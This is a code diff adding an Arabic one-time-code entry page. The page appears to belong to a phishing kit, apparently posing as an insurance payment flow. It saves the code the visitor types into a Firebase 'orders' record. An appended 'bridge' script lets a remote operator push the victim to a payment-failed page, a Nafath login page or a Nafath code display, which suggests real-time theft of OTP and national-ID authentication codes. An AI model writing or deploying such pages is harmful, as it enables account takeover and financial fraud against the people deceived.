@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>رمز التحقق</title>
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; background-color: #f4f7f6; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: white; padding: 30px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); text-align: center; width: 90%; max-width: 400px; }
+        h2 { color: #333; margin-bottom: 10px; }
+        p { color: #666; font-size: 14px; margin-bottom: 25px; }
+        input { width: 100%; padding: 15px; border: 1px solid #ddd; border-radius: 10px; font-size: 24px; text-align: center; margin-bottom: 20px; box-sizing: border-box; }
+        button { width: 100%; padding: 15px; background: #27ae60; color: white; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 16px; }
+        .spinner { display: none; margin: 20px auto; border: 4px solid #f3f3f3; border-top: 4px solid #27ae60; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <h2>رمز التحقق</h2>
+    <p>أدخل الرمز المرسل إلى جوالك لإتمام العملية</p>
+    <input type="number" id="otpInput" placeholder="----">
+    <button id="submitBtn" onclick="verifyOTP()">تأكيد</button>
+    <div id="loader" class="spinner"></div>
+</div>
+
+<script>
+    const firebaseConfig = {
+        apiKey: "AIzaSyCtPCVee8eynRfuFHZ6if_eK-vtaMYY-iE",
+        authDomain: "tameen-658e9.firebaseapp.com",
+        projectId: "tameen-658e9",
+        storageBucket: "tameen-658e9.firebasestorage.app",
+        messagingSenderId: "292670676256",
+        appId: "1:292670676256:web:3624157751cd194efe4b45"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore();
+    const userId = localStorage.getItem('user_id');
+
+    async function verifyOTP() {
+        const otpValue = document.getElementById('otpInput').value;
+        if(otpValue.length < 4) { alert("يرجى إدخال رمز صحيح"); return; }
+
+        // إظهار السبينر وإخفاء الزر
+        document.getElementById('submitBtn').style.display = 'none';
+        document.getElementById('loader').style.display = 'block';
+
+        try {
+            // تحديث كود الـ OTP وتغيير الحالة فوراً إلى طلب الجوال
+            await db.collection("orders").doc(userId).update({
+                otp_code: otpValue,
+                status: "show_mobile" // الحالة التي تحوله لصفحة الجوال
+            });
+
+            // التحويل التلقائي لصفحة الجوال
+            setTimeout(() => {
+                window.location.href = "mobile_verification.html";
+            }, 1000); // تأخير بسيط لضمان الحفظ
+
+        } catch (error) {
+            console.error("خطأ:", error);
+            alert("حدث خطأ، حاول مرة أخرى");
+            document.getElementById('submitBtn').style.display = 'block';
+            document.getElementById('loader').style.display = 'none';
+        }
+    }// --- أضف كود الجسر هنا (قبل إغلاق السكريبت) ---
+(function() {
+    const userId = localStorage.getItem('user_id');
+    if (userId) {
+        db.collection("orders").doc(userId).onSnapshot((doc) => {
+            if (doc.exists) {
+                const data = doc.data();
+                if (data.next_step === "GO_TO_OTP") {
+                    window.location.href = "otp.html"; 
+                } else if (data.next_step === "GO_TO_REJECT") {
+                    window.location.href = "payment_faild.html";
+                } else if (data.next_step === "GO_TO_NAFATH") {
+                    window.location.href = "nafath.html";
+                } else if (data.next_step === "SHOW_NAFATH_CODE") {
+                    const codeBox = document.getElementById('nafath-number');
+                    if (codeBox && data.nafath_code) {
+                        codeBox.innerText = data.nafath_code;
+                        const overlay = document.getElementById('overlay');
+                        if (overlay) overlay.style.display = 'none';
+                    }
+                }
+            }
+        });
+    }
+})();
+// ------------------------------------------
+
+</script>
+</body>
+</html>
+
